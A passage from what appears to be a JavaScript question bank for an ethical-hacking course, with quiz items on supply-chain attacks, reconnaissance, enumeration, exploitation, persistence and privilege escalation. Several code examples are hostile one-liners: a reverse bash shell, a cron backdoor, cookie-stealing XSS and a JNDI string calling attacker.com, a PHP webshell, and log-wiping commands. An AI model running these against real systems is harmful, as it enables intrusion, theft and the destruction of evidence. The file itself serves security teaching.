      question: "What was the significance of the 2020 SolarWinds cyber attack in terms of software supply chain security?",
      shortAnswer: "Adversaries injected malicious code (SUNBURST) directly into SolarWinds Orion source builds during compilation, compromising thousands of government agencies and Fortune 500 networks via signed, trusted updates.",
      explanation: "SolarWinds demonstrated that perimeter defenses and digital code-signing signatures cannot protect against compromised build pipelines, giving rise to Software Bills of Materials (SBOMs).",
      hint: "Tainted software update containing malicious backdoor delivered to 18,000 customers.",
      level: "advanced",
      codeExample: "// SUNBURST backdoor stealth execution delay:\nThread.Sleep(new Random().Next(288, 336) * 3600 * 1000); // 12-14 days sleep"
    },
    {
      question: "What is an SBOM (Software Bill of Materials) and how does it prevent supply chain vulnerabilities like Log4Shell?",
      shortAnswer: "An SBOM is a formal, machine-readable inventory of all software components, third-party libraries, and dependencies included within an application build.",
      explanation: "When Log4Shell (CVE-2021-44228) hit, organizations with an SBOM instantly identified every application utilizing the vulnerable `log4j-core` library within minutes instead of weeks of manual code audits.",
      hint: "Comprehensive component and library inventory tracking all software dependencies.",
      level: "advanced",
      codeExample: "cyclonedx-cli merge --input-files sbom-frontend.json sbom-backend.json --output-file final-sbom.json"
    },
    {
      question: "What role did ethical hackers play in uncovering and mitigating the Log4Shell (CVE-2021-44228) vulnerability?",
      shortAnswer: "Alibaba Cloud security researchers discovered the JNDI lookup injection flaw in Apache Log4j, responsibly alerted Apache, and published detection scripts and WAF regex rules globally.",
      explanation: "Log4Shell allowed unauthenticated remote code execution via `${jndi:ldap://...}` headers. Ethical security researchers worked around the clock to create hot-patches (e.g. Log4jHotPatch) before mass automated exploitation.",
      hint: "JNDI lookup injection flaw responsibly reported by security researchers.",
      level: "advanced",
      codeExample: "${jndi:ldap://attacker.com/a} # Log4Shell JNDI injection string"
    }
  ]
};

// -----------------------------------------------------------------------------
// MODULE 002_003: Phases of Hacking Methodology
// -----------------------------------------------------------------------------

const mod2_003 = {
  '002_003_phases-of-hacking/topic0_files/topic0_questions.js': [
    {
      question: "What are the canonical 5 Phases of Hacking according to international ethical hacking standards?",
      shortAnswer: "1. Reconnaissance (Footprinting), 2. Scanning & Enumeration, 3. Gaining Access (Exploitation), 4. Maintaining Access (Persistence), 5. Covering Tracks.",
      explanation: "Standardized by CEH and NIST, this 5-stage sequential methodology mirrors the steps an attacker takes to compromise target systems and conceal their presence.",
      hint: "Reconnaissance, Scanning, Gaining Access, Maintaining Access, Covering Tracks.",
      level: "basic",
      codeExample: "HackingPhases = ['Reconnaissance', 'Scanning', 'GainingAccess', 'MaintainingAccess', 'CoveringTracks'];"
    },
    {
      question: "Why is the Reconnaissance phase considered the most time-consuming yet critical phase of an attack?",
      shortAnswer: "Because thorough reconnaissance identifies the exact technologies, subdomains, employee emails, and misconfigurations, maximizing the probability of a successful, stealthy breach.",
      explanation: "Upwards of 70% of an engagement's effort is spent on reconnaissance. Incomplete intelligence leads to triggering alarms or attacking non-vulnerable hardened defenses.",
      hint: "Spending ~70% of effort mapping attack surfaces to ensure precision.",
      level: "moderate",
      codeExample: "sublist3r -d target.com -o subdomains.txt # Recon subdomain mapping"
    },
    {
      question: "How does the 'Scanning' phase differ fundamentally from 'Reconnaissance'?",
      shortAnswer: "Reconnaissance gathers general information (often passively); Scanning actively connects to target IP addresses to probe for live hosts, open ports, service versions, and vulnerabilities.",
      explanation: "Scanning involves sending packets directly to the victim's network interfaces, creating log entries and potentially triggering firewalls and IDS/IPS sensors.",
      hint: "Passive discovery vs active network packet probing of IP addresses.",
      level: "moderate",
      codeExample: "nmap -sS -p 1-65535 -T4 192.168.1.1 # Active scanning"
    },
    {
      question: "In the 'Gaining Access' phase, what is the difference between a payload and an exploit?",
      shortAnswer: "An exploit is the software mechanism that takes advantage of a specific vulnerability; a payload is the actual malicious code delivered and executed by the exploit (e.g. reverse shell).",
      explanation: "The exploit breaks through the defensive wall; the payload performs the attacker's desired action once inside (e.g. spawning a command prompt or encrypting files).",
      hint: "Exploit breaches the vulnerability; payload executes the attacker's code.",
      level: "moderate",
      codeExample: "use exploit/windows/smb/ms17_010_eternalblue\nset PAYLOAD windows/x64/meterpreter/reverse_tcp"
    },
    {
      question: "Why do ethical hackers simulate 'Covering Tracks' only by documentation rather than deleting real production logs?",
      shortAnswer: "Because deleting audit logs in client environments violates data integrity, destroys corporate forensic trails, and causes operational damage.",
      explanation: "Ethical testers explain how an attacker would erase event logs (e.g. `wevtutil cl Security`) without actually wiping logs on production servers.",
      hint: "Never delete client audit logs; demonstrate the vulnerability theoretically in reports.",
      level: "moderate",
      codeExample: "# Real Blackhat command to avoid on client servers:\nwevtutil cl Application && wevtutil cl System"
    }
  ],

  '002_003_phases-of-hacking/topic1_files/topic1_questions.js': [
    {
      question: "What is the key technical difference between Passive Reconnaissance and Active Footprinting?",
      shortAnswer: "Passive reconnaissance collects data without sending a single packet to the target's infrastructure; active footprinting directly communicates with target servers and devices.",
      explanation: "Passive uses public third-party databases (WHOIS, DNS records, Google Dorks, Shodan, LinkedIn); active uses ping sweeps, port scans, and HTTP header queries.",
      hint: "Zero packet interaction with target servers vs direct packet probing.",
      level: "basic",
      codeExample: "whois target.com # Passive vs ping target.com # Active"
    },
    {
      question: "How do Google Dorks (Advanced Search Operators) facilitate passive reconnaissance?",
      shortAnswer: "By querying Google's indexed cache using specialized search filters (`site:`, `filetype:`, `inurl:`, `intitle:`) to locate accidentally exposed passwords, backup files, and admin panels.",
      explanation: "Google Dorks reveal confidential PDFs, SQL dumps, `.env` files, and staging environments without alerting the target company's firewalls.",
      hint: "Search filters like filetype:env or inurl:admin to find exposed credentials.",
      level: "moderate",
      codeExample: "site:target.com filetype:env DB_PASSWORD"
    },
    {
      question: "What is the role of Shodan and Censys in passive infrastructure reconnaissance?",
      shortAnswer: "They are search engines that continuously crawl and index Internet-connected devices, recording open ports, SSL certificates, banner headers, and device types worldwide.",
      explanation: "Attackers can find exposed industrial SCADA controllers, unpatched cameras, or vulnerable RDP servers belonging to an organization without scanning the victim directly.",
      hint: "Search engines indexing Internet-of-Things devices and server banners.",
      level: "moderate",
      codeExample: "shodan search 'org:\"Target Corporation\" port:3389'"
    },
    {
      question: "How does DNS Zone Transfer (AXFR) work and why is it a severe reconnaissance vulnerability?",
      shortAnswer: "An AXFR query requests a secondary DNS server to replicate its entire database of DNS mappings; if misconfigured, it exposes all internal hostnames, IP addresses, and subdomains.",
      explanation: "Administrators should configure DNS name servers to permit zone transfers only to trusted secondary IP addresses, not to public queries.",
      hint: "Querying DNS servers using AXFR to dump complete internal host lists.",
      level: "moderate",
      codeExample: "dig @ns1.target.com target.com AXFR"
    },
    {
      question: "What information can be extracted from WHOIS and RDAP records during footprinting?",
      shortAnswer: "Domain registration dates, registrar names, administrative/technical contact email addresses, phone numbers, and authoritative DNS nameserver records.",
      explanation: "Registrar records often reveal corporate IT employee names and email patterns (e.g. `john.doe@target.com`), which feed directly into phishing campaigns.",
      hint: "Domain registrar details, technical contacts, and authoritative nameservers.",
      level: "basic",
      codeExample: "rdap.net/domain/target.com"
    }
  ],

  '002_003_phases-of-hacking/topic2_files/topic2_questions.js': [
    {
      question: "What is the purpose of the Maltego intelligence mapping tool in OSINT investigations?",
      shortAnswer: "To graphically map and visualize relationships between people, domains, DNS records, email addresses, IP ranges, and social media entities using automated data transforms.",
      explanation: "Maltego automates complex queries to public APIs (HaveIBeenPwned, VirusTotal, Censys), drawing node-link relationship diagrams that uncover hidden infrastructure links.",
      hint: "Visual node-link graphing tool automating transforms across public datasets.",
      level: "moderate",
      codeExample: "maltego_transform: domain_to_dns_records(target.com) -> [mx, ns, txt, a]"
    },
    {
      question: "How does `theHarvester` automate OSINT gathering for penetration testers?",
      shortAnswer: "It queries dozens of public search engines, PGP key servers, and LinkedIn APIs to extract employee email addresses, employee names, virtual hosts, and open ports.",
      explanation: "Provides quick reconnaissance lists of valid corporate email addresses that can be tested for credential stuffing or spear-phishing.",
      hint: "Python tool harvesting emails, employee names, and subdomains from search engines.",
      level: "basic",
      codeExample: "theHarvester -d target.com -b google,linkedin,bing -l 500"
    },
    {
      question: "What is Certificate Transparency (CT) logging and how is it used in subdomain enumeration?",
      shortAnswer: "CT logs are publicly auditable, append-only cryptographic records of all issued SSL/TLS certificates; querying them reveals every registered subdomain within seconds.",
      explanation: "Sites like `crt.sh` allow attackers and defenders to discover newly created development and staging subdomains (e.g. `dev-api.target.com`) as soon as certificates are generated.",
      hint: "Public cryptographic ledger of all issued SSL certificates revealing subdomains.",
      level: "moderate",
      codeExample: "curl -s 'https://crt.sh/?q=%.target.com&output=json' | jq -r '.[].name_value' | sort -u"
    },
    {
      question: "How does Wayback Machine (Internet Archive) assist OSINT research on modernized websites?",
      shortAnswer: "It stores historical snapshots of web pages, allowing researchers to view decommissioned directories, old employee rosters, deleted API documentation, and past email addresses.",
      explanation: "Developers often delete links from current navigation while leaving the underlying scripts, endpoints, or database dumps accessible on live web servers.",
      hint: "Historical website snapshots revealing deleted files and old documentation.",
      level: "moderate",
      codeExample: "waybackurls target.com | grep -E '\\.(sql|bak|env|conf)$'"
    },
    {
      question: "What ethical and legal boundaries govern Open-Source Intelligence (OSINT) collection?",
      shortAnswer: "OSINT collection must strictly utilize publicly accessible information; bypassing login portals, accessing paywalled databases with stolen credentials, or stalking individuals crosses into illegal activity.",
      explanation: "Passively viewing public records is lawful; weaponizing personal details to harass, impersonate, or execute social engineering attacks is legally actionable.",
      hint: "Only public data is permitted; no bypassing authentication or stalking.",
      level: "basic",
      codeExample: "Ethical_OSINT_Rule: 'Never attempt unauthorized login or probe behind firewalls.'"
    }
  ],

  '002_003_phases-of-hacking/topic3_files/topic3_questions.js': [
    {
      question: "What is Network Enumeration and how does it advance an attack beyond basic port scanning?",
      shortAnswer: "Enumeration establishes active connections to open services to query specific details: user accounts, group names, network shares, routing tables, and service software versions.",
      explanation: "Port scanning merely identifies that port 445 is open; enumeration queries SMB to extract exact Windows domain names, share permissions, and user lists.",
      hint: "Querying open services directly to pull user lists, shares, and exact versions.",
      level: "moderate",
      codeExample: "enum4linux -a 192.168.1.50 # Comprehensive SMB enumeration"
    },
    {
      question: "How does an attacker enumerate SNMP (Simple Network Management Protocol) services on UDP port 161?",
      shortAnswer: "By querying SNMP community strings (e.g. default 'public' or 'private') to extract system uptime, network interfaces, IP routing tables, and running process lists.",
      explanation: "SNMPv1 and SNMPv2c transmit community strings in cleartext; guessing the string allows complete reconnaissance of router and switch configurations.",
      hint: "Using community strings like 'public' on UDP 161 to dump router configurations.",
      level: "moderate",
      codeExample: "snmpwalk -v 2c -c public 192.168.1.1 1.3.6.1.2.1.25.4.2.1.2 # Process list OID"
    },
    {
      question: "What is LDAP enumeration in Active Directory environments?",
      shortAnswer: "Querying the Lightweight Directory Access Protocol (TCP port 389/636) to list all domain users, security groups, organizational units (OUs), and computer objects.",
      explanation: "LDAP enumeration maps the entire enterprise privilege hierarchy, identifying high-value targets like members of the 'Domain Admins' group.",
      hint: "Querying port 389 to map domain users, computers, and Domain Admin groups.",
      level: "moderate",
      codeExample: "ldapsearch -x -H ldap://dc01.corp.local -b 'dc=corp,dc=local' '(objectClass=user)' sAMAccountName"
    },
    {
      question: "How does SMTP VRFY and EXPN command enumeration work on legacy mail servers?",
      shortAnswer: "The VRFY command asks the mail server to verify if a username exists; EXPN asks the server to expand and reveal members of a mailing list.",
      explanation: "Attackers iterate through dictionaries of common names (admin, root, bob, alice); 250 responses confirm valid usernames for subsequent brute-force attacks.",
      hint: "SMTP commands VRFY and EXPN to confirm if email accounts exist.",
      level: "moderate",
      codeExample: "nc -nv 192.168.1.25 25\nVRFY root\n250 2.1.5 root@target.com"
    },
    {
      question: "What defensive controls block unauthorized network enumeration?",
      shortAnswer: "Disabling default community strings (SNMPv3), blocking anonymous LDAP and SMB NULL sessions, restricting RPC endpoint mapping, and deploying strict egress/ingress firewalls.",
      explanation: "Enforcing authentication on directory services and filtering management ports ensures that unauthorized scanners receive no responsive data.",
      hint: "Enforce authentication, disable null sessions, and upgrade to SNMPv3.",
      level: "moderate",
      codeExample: "// Windows Registry: RestrictAnonymous = 1 to prevent anonymous enumeration"
    }
  ],

  '002_003_phases-of-hacking/topic4_files/topic4_questions.js': [
    {
      question: "What is the difference between a TCP SYN (Stealth) scan and a TCP Connect scan in Nmap?",
      shortAnswer: "SYN scan (-sS) sends a SYN and responds with RST upon receiving SYN-ACK without completing the 3-way handshake; Connect scan (-sT) completes the full 3-way handshake (SYN, SYN-ACK, ACK).",
      explanation: "SYN scans are faster, require raw root socket privileges, and traditionally bypassed application-level logging because connections were never formally established.",
      hint: "SYN-ACK followed by RST (half-open) vs completing full 3-way handshake.",
      level: "moderate",
      codeExample: "nmap -sS target_ip # SYN stealth scan vs nmap -sT target_ip # Full TCP connect"
    },
    {
      question: "What does 'Banner Grabbing' achieve during service scanning?",
      shortAnswer: "It captures the introductory text string or header transmitted by an open port, revealing the exact software product, version number, and underlying operating system.",
      explanation: "For example, connecting to port 22 might return 'SSH-2.0-OpenSSH_7.4p1 Debian-10', allowing an attacker to immediately look up known CVEs for OpenSSH 7.4.",
      hint: "Connecting to open ports to read the greeting header containing software versions.",
      level: "basic",
      codeExample: "curl -I https://target.com # Grabs Server and X-Powered-By HTTP headers"
    },
    {
      question: "What is an Nmap Scripting Engine (NSE) script and how is it used in vulnerability scanning?",
      shortAnswer: "NSE scripts are automated Lua scripts run by Nmap to automate vulnerability detection, advanced service discovery, and backdoor detection across open ports.",
      explanation: "Nmap provides hundreds of built-in scripts grouped into categories like `vuln`, `auth`, `discovery`, and `safe`.",
      hint: "Lua scripts built into Nmap for automated vulnerability detection.",
      level: "moderate",
      codeExample: "nmap -p 445 --script smb-vuln-ms17-010 192.168.1.0/24"
    },
    {
      question: "How do commercial vulnerability scanners (Nessus, Qualys, OpenVAS) evaluate risk?",
      shortAnswer: "They probe targets with vulnerability plugins, match software version signatures and configurations against CVE databases, and rank risks by CVSS scores.",
      explanation: "Scanners produce structured vulnerability inventories categorized into Critical, High, Medium, and Low, complete with remediation and patch recommendations.",
      hint: "Automated scanning matching CVE databases and rating risks by CVSS scores.",
      level: "moderate",
      codeExample: "nessuscli scan --start --id 42 # Triggers automated vulnerability assessment"
    },
    {
      question: "What is a UDP port scan and why is it substantially slower than TCP scanning?",
      shortAnswer: "UDP is connectionless; scanners send empty UDP packets and must wait for an ICMP Port Unreachable error. If no response arrives, the port is marked 'open|filtered'.",
      explanation: "Operating systems rate-limit ICMP error generation (e.g. Linux limits ICMP Unreachable to 1 per second), forcing UDP scans across 65,535 ports to take hours.",
      hint: "Connectionless nature and OS ICMP rate limiting make UDP scanning slow.",
      level: "advanced",
      codeExample: "nmap -sU -p 53,67,123,161 -T4 target_ip # Targeted UDP scan of common services"
    }
  ],

  '002_003_phases-of-hacking/topic5_files/topic5_questions.js': [
    {
      question: "What is the primary objective of Phase 3: Gaining Access in the hacking methodology?",
      shortAnswer: "To transition from passive/active observation to active compromise by exploiting identified security weaknesses to execute code, bypass authentication, or obtain an initial foothold.",
      explanation: "Phase 3 transforms reconnaissance data into interactive control over a target system, application, or network asset.",
      hint: "Exploiting identified vulnerabilities to establish an interactive foothold.",
      level: "basic",
      codeExample: "msfconsole -q -x 'use exploit/...; run'"
    },
    {
      question: "What is a 'Zero-Day Exploit' compared to a 'N-Day Exploit'?",
      shortAnswer: "A Zero-Day exploits a vulnerability unknown to the vendor with zero patches available; an N-Day exploits a disclosed vulnerability where a patch exists but has not been applied by the victim.",
      explanation: "Zero-days command high black-market prices ($100k-$2M); N-days constitute >90% of real-world breaches due to delayed enterprise patching cycles.",
      hint: "Unknown flaw with zero patches vs publicly known flaw unpatched by victim.",
      level: "moderate",
      codeExample: "// N-Day timeline: Patch released Day 0 -> Reverse engineered Day 3 -> Exploited Day 14"
    },
    {
      question: "What is the difference between a Remote Code Execution (RCE) and a Local Privilege Escalation (LPE)?",
      shortAnswer: "RCE allows an unauthenticated attacker across the network to execute arbitrary commands; LPE allows an attacker with low-privilege user access to elevate permissions to root or SYSTEM.",
      explanation: "RCE provides the initial external foothold; LPE provides total administrative control over the compromised operating system.",
      hint: "Network-based compromise vs elevating from basic user to administrator.",
      level: "moderate",
      codeExample: "RCE -> Spawns low-privilege shell (www-data) -> LPE -> Spawns root shell (#)"
    },
    {
      question: "How does a 'Reverse Shell' differ from a 'Bind Shell'?",
      shortAnswer: "A Bind Shell opens a listening port on the victim that the attacker connects to; a Reverse Shell makes the victim connect back outwards to the attacker's listening machine.",
      explanation: "Reverse shells are preferred because stateful firewalls typically block unsolicited incoming traffic but allow outgoing HTTP/HTTPS/DNS traffic from the victim.",
      hint: "Victim connects outbound to attacker to bypass restrictive inbound firewalls.",
      level: "moderate",
      codeExample: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 # One-line reverse bash shell"
    },
    {
      question: "What role does Social Engineering play in Phase 3 Gaining Access?",
      shortAnswer: "It bypasses technical firewall and encryption defenses by manipulating human users into executing malicious attachments, entering credentials into fake portals, or granting remote access.",
      explanation: "Spear-phishing emails carrying weaponized macro documents or malicious links represent the most statistically common initial access vector for ransomware syndicates.",
      hint: "Manipulating human psychology to execute payloads or surrender passwords.",
      level: "basic",
      codeExample: "Subject: 'Urgent: Wire Transfer Verification Form' Attachment: invoice.docm"
    },
    {
      question: "What is a Staged Payload vs a Stageless Payload in exploit delivery?",
      shortAnswer: "A Staged payload sends a tiny stub (Stager) that allocates memory and downloads the larger payload (Stage); a Stageless payload sends the complete monolithic payload in a single transfer.",
      explanation: "Staged payloads fit into restrictive memory buffers (e.g. small stack overflows); stageless payloads are simpler and avoid multi-step network connections that EDRs can detect.",
      hint: "Small stub downloading larger code vs single monolithic executable.",
      level: "advanced",
      codeExample: "windows/meterpreter/reverse_tcp (Staged) vs windows/meterpreter_reverse_tcp (Stageless)"
    },
    {
      question: "How do Web Application Exploits (e.g. SQLi, Command Injection, File Upload) enable system access?",
      shortAnswer: "Flaws in web input validation permit attackers to run arbitrary OS shell commands, extract password hashes from databases, or upload executable webshells to the web root.",
      explanation: "Once a webshell (e.g. PHP shell) is uploaded, the attacker gains remote command execution under the web server user identity (`www-data` or `IUSR`).",
      hint: "Uploading malicious scripts or injecting OS commands through vulnerable web inputs.",
      level: "moderate",
      codeExample: "<?php system($_GET['cmd']); ?> # Minimal PHP webshell payload"
    },
    {
      question: "What is Password Spraying in authentication attacks?",
      shortAnswer: "Testing a single common password (e.g. 'Winter2024!') across thousands of enterprise user accounts to avoid triggering account lockout thresholds.",
      explanation: "Traditional brute-forcing tests thousands of passwords on one account, triggering account lockouts; password spraying tests one password on many accounts slowly.",
      hint: "Testing one common password against thousands of user accounts to avoid lockouts.",
      level: "moderate",
      codeExample: "kerbrute passwordspray -d corp.local userlist.txt 'Welcome2024!'"
    },
    {
      question: "What is a 'Drive-By Download' attack?",
      shortAnswer: "Unintentional download and execution of malicious code onto a victim's device occurring simply by visiting an infected or compromised website without any user clicking.",
      explanation: "Attackers embed exploit kits in compromised ad networks (malvertising) that exploit unpatched browser or plugin vulnerabilities to execute shellcode invisibly.",
      hint: "Infection occurring automatically when visiting an infected website without clicking.",
      level: "moderate",
      codeExample: "<iframe src='http://malicious-exploit-kit.com/iframe' style='display:none;'></iframe>"
    },
    {
      question: "What is a Man-in-the-Middle (MitM) attack during access exploitation?",
      shortAnswer: "An attack where the adversary secretly intercepts and relays communications between two parties who believe they are communicating directly with each other.",
      explanation: "Techniques like ARP spoofing, DNS poisoning, and rogue Wi-Fi access points enable MitM attackers to steal session cookies, credentials, and inject malicious payload scripts.",
      hint: "Secretly intercepting communications between two endpoints to steal credentials.",
      level: "moderate",
      codeExample: "arpspoof -i eth0 -t 192.168.1.10 192.168.1.1 # Poisons ARP cache between victim & gateway"
    },
    {
      question: "How does Credential Stuffing leverage historical data breaches?",
      shortAnswer: "Attackers take automated lists of leaked username/password pairs from past public breaches and blast them against other unrelated websites where users reused the same credentials.",
      explanation: "Because over 60% of internet users reuse identical passwords across services, credential stuffing yields high automated login success rates.",
      hint: "Testing previously leaked email/password pairs across different websites.",
      level: "basic",
      codeExample: "hydra -L leaked_emails.txt -P leaked_passwords.txt target.com https-post-form"
    },
    {
      question: "What is Cross-Site Scripting (XSS) and how does Stored XSS lead to session hijacking?",
      shortAnswer: "XSS injects malicious client-side JavaScript into trusted websites; Stored XSS persists in the database and executes in the browsers of visiting users, exfiltrating session tokens.",
      explanation: "If a web application fails to sanitize inputs, an injected script executes `document.cookie`, sending session authentication cookies back to the attacker's listener.",
      hint: "Injecting malicious JavaScript that runs in victims' browsers to steal cookies.",
      level: "moderate",
      codeExample: "<script>fetch('http://attacker.com/steal?c='+document.cookie);</script>"
    },
    {
      question: "What is Server-Side Request Forgery (SSRF) and how did it facilitate the 2019 Capital One cloud breach?",
      shortAnswer: "SSRF tricks a backend server into making HTTP requests to internal, non-routable resources; at Capital One, an attacker queried the AWS metadata service to extract IAM credentials.",
      explanation: "By targeting `http://169.254.169.254/latest/meta-data/iam/security-credentials/`, the attacker acquired temporary AWS access tokens that unlocked S3 buckets holding 100M records.",
      hint: "Tricking the server into querying the AWS metadata IP 169.254.169.254 for IAM keys.",
      level: "advanced",
      codeExample: "http://target.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    },
    {
      question: "What is Binary Exploitation and what role does Shellcode play?",
      shortAnswer: "Binary exploitation corrupts a compiled program's execution flow (via buffer overflow or format string); Shellcode is the injected machine code executed when the instruction pointer (EIP/RIP) is hijacked.",
      explanation: "The shellcode typically issues a syscall (e.g. `execve('/bin/sh')`) to spawn an interactive command shell for the attacker.",
      hint: "Overwriting memory pointers to execute injected machine code instructions.",
      level: "advanced",
      codeExample: "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50... # /bin/sh shellcode"
    },
    {
      question: "What is the defensive concept of 'Least Privilege' and how does it restrict Gaining Access impact?",
      shortAnswer: "Ensuring that every user account, process, and application is granted only the absolute minimum system permissions necessary to perform its essential function.",
      explanation: "If a compromised web application runs as an unprivileged user (`www-data`) rather than `root`, the attacker cannot install kernel rootkits or access SAM/shadow files without a secondary exploit.",
      hint: "Limiting process and user accounts to absolute minimum permissions.",
      level: "basic",
      codeExample: "# Enforcing unprivileged daemon execution:\nuseradd -r -s /bin/false app_service"
    }
  ],

  '002_003_phases-of-hacking/topic6_files/topic6_questions.js': [
    {
      question: "What is a Buffer Overflow and how does it overwrite the Instruction Pointer (EIP/RIP)?",
      shortAnswer: "Writing more data to a memory buffer than it is allocated to hold, overflowing adjacent stack memory to overwrite the saved return address (EIP/RIP) with an address pointing to malicious shellcode.",
      explanation: "Classic stack-based buffer overflows exploit unsafe C library functions like `strcpy()`, `gets()`, and `sprintf()` which fail to perform array bounds checking.",
      hint: "Writing past memory boundaries to overwrite the function return address.",
      level: "advanced",
      codeExample: "char buf[64]; gets(buf); // Unsafe: no boundary check allows stack corruption"
    },
    {
      question: "What modern compiler and OS defenses mitigate buffer overflow exploits?",
      shortAnswer: "ASLR (Address Space Layout Randomization), DEP/NX (Data Execution Prevention / No-Execute), Stack Canaries, and SafeSEH.",
      explanation: "ASLR randomizes memory offsets on boot; DEP marks stack and heap memory pages as non-executable, preventing injected shellcode from executing.",
      hint: "ASLR, Stack Canaries, and non-executable stack memory (DEP/NX).",
      level: "advanced",
      codeExample: "gcc -fstack-protector-all -Wl,-z,relro,-z,now -D_FORTIFY_SOURCE=2 app.c"
    },
    {
      question: "What is 'Pass-the-Hash' (PtH) in Windows Active Directory environments?",
      shortAnswer: "An attack technique where an adversary uses an extracted NTLM password hash directly to authenticate against remote network services via SMB without needing the plaintext password.",
      explanation: "Windows NTLM authentication verifies hash values; the attacker does not need to crack the hash to gain access to remote servers.",
      hint: "Using stolen NTLM hashes directly to authenticate over SMB without cracking.",
      level: "moderate",
      codeExample: "crackmapexec smb 192.168.1.0/24 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'"
    },
    {
      question: "How does the Mimikatz post-exploitation tool extract plaintext passwords from LSASS memory?",
      shortAnswer: "By reading the memory space of `lsass.exe` (Local Security Authority Subsystem Service), which caches plaintext passwords and Kerberos tickets for single sign-on services (WDigest).",
      explanation: "Benjamin Delpy developed Mimikatz to show that Windows held plaintext credentials in memory; modern Windows versions disable WDigest caching by default.",
      hint: "Dumping LSASS memory to extract cached credentials and Kerberos tickets.",
      level: "advanced",
      codeExample: "sekurlsa::logonpasswords # Mimikatz command dumping cached credentials"
    },
    {
      question: "What is an SQL Injection (SQLi) attack and how does it compromise authentication portals?",
      shortAnswer: "Inserting malicious SQL query fragments into input fields that alter backend query logic (e.g. `' OR '1'='1`), tricking the database into validating logins without a password.",
      explanation: "SQLi occurs when user input is concatenated directly into query strings rather than bound using parameterized Prepared Statements.",
      hint: "Injecting SQL commands like ' OR '1'='1 to bypass authentication.",
      level: "basic",
      codeExample: "SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1';"
    }
  ],

  '002_003_phases-of-hacking/topic7_files/topic7_questions.js': [
    {
      question: "What is the primary objective of Phase 4: Maintaining Access in hacking methodologies?",
      shortAnswer: "To establish reliable, long-term persistence mechanisms so the attacker can re-enter the network even after system reboots, credential resets, or temporary network disconnects.",
      explanation: "Initial exploits may be ephemeral or patched; attackers install persistent backdoors, scheduled tasks, and secondary admin accounts to preserve their foothold.",
      hint: "Ensuring persistent access across system reboots and credential resets.",
      level: "basic",
      codeExample: "crontab -e -> @reboot /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'"
    },
    {
      question: "What is a 'Rootkit' and how does a Kernel-mode rootkit differ from a User-mode rootkit?",
      shortAnswer: "A rootkit is stealth software that hides malicious processes and files from the OS; Kernel-mode rootkits run in Ring 0 modifying kernel tables, while User-mode rootkits operate in Ring 3 intercepting API calls.",
      explanation: "Kernel rootkits modify System Service Dispatch Tables (SSDT) or Direct Kernel Object Manipulation (DKOM), making them completely invisible to standard antivirus and Task Manager.",
      hint: "Stealth software hiding processes; Ring 0 kernel level vs Ring 3 user level.",
      level: "advanced",
      codeExample: "// DKOM unlinking process from ActiveProcessLinks list to make it invisible in Task Manager"
    },
    {
      question: "How do attackers establish persistence using Windows Registry Run keys?",
      shortAnswer: "By writing the file path of a payload into registry keys like `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`, executing the malware automatically whenever a user logs in.",
      explanation: "Run and RunOnce registry keys are among the most common autostart extensibility points (ASEPs) monitored by EDR and Autoruns tools.",
      hint: "Writing payload paths to the Run registry key to auto-start on user login.",
      level: "moderate",
      codeExample: "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d 'C:\\Users\\Public\\agent.exe'"
    },
    {
      question: "What are Scheduled Tasks and Cron Jobs in the context of persistence?",
      shortAnswer: "System utilities configured by attackers to execute payloads at predetermined recurring intervals (e.g. daily at 2:00 AM) or upon system startup with elevated privileges.",
      explanation: "Scheduled tasks run under the `SYSTEM` account on Windows, providing both persistence and automatic privilege maintenance.",
      hint: "Configuring Windows Task Scheduler or Linux crontab to run backdoors periodically.",
      level: "basic",
      codeExample: "schtasks /create /sc daily /tn 'SystemHealthUpdate' /tr 'C:\\Windows\\Temp\\beacon.exe' /st 03:00 /ru SYSTEM"
    },
    {
      question: "What is a Command and Control (C2) framework and what are popular examples?",
      shortAnswer: "A centralized software platform used by attackers to manage compromised endpoints (beacons), issue commands, exfiltrate data, and automate lateral movement (e.g. Cobalt Strike, Mythic, Sliver).",
      explanation: "C2 agents use malleable HTTP/DNS profiles to blend beacon traffic into legitimate enterprise web traffic, evading network anomaly detection.",
      hint: "Platform managing compromised bots using malleable HTTP/DNS beacon profiles.",
      level: "advanced",
      codeExample: "CobaltStrike_Profile: 'Set sleep 60s, jitter 20%, disguising traffic as jQuery.min.js requests'"
    }
  ],

  '002_003_phases-of-hacking/topic8_files/topic8_questions.js': [
    {
      question: "What is the difference between Horizontal and Vertical Privilege Escalation?",
      shortAnswer: "Vertical escalation elevates permissions from a standard user to an administrative or root account; Horizontal escalation accesses accounts or data belonging to another user at the same permission level.",
      explanation: "Vertical: standard user -> root/SYSTEM. Horizontal: Student A accessing Student B's financial records using B's user ID.",
      hint: "Standard user to root (vertical) vs accessing another standard user's data (horizontal).",
      level: "basic",
      codeExample: "Vertical: sudo su (or exploit) -> root; Horizontal: GET /profile?id=102 (IDOR)"
    },
    {
      question: "What is SUID/SGID abuse in Linux privilege escalation?",
      shortAnswer: "Exploiting executable binaries that have the SUID bit set, which execute with the file owner's (root) permissions instead of the executing user's permissions.",
      explanation: "If binaries like `find`, `vim`, or custom scripts with SUID root allow shell escaping (GTFOBins), a standard user can spawn a root bash shell immediately.",
      hint: "Executing binaries with the SUID bit set that run with root privileges.",
      level: "moderate",
      codeExample: "find . -exec /bin/sh -p \\; -quit # SUID root escape via find"
    },
    {
      question: "What is Lateral Movement and what protocols are commonly abused in enterprise networks?",
      shortAnswer: "The process of navigating from an initially compromised host across the internal network to compromise additional workstations and domain controllers using SMB, RDP, WMI, and WinRM.",
      explanation: "Adversaries leverage stolen credentials or Kerberos tickets to execute commands remotely across internal subnets without re-exploiting external perimeters.",
      hint: "Navigating across internal network machines using SMB, RDP, and WMI.",
      level: "moderate",
      codeExample: "wmic /node:192.168.1.50 /user:DOMAIN\\admin process call create 'powershell.exe -enc ...'"
    },
    {
      question: "What is a Kerberoasting attack in Active Directory environments?",
      shortAnswer: "An attack where any authenticated domain user requests Kerberos service tickets (TGS) for Service Principal Names (SPNs) and cracks the ticket hashes offline to reveal plaintext service passwords.",
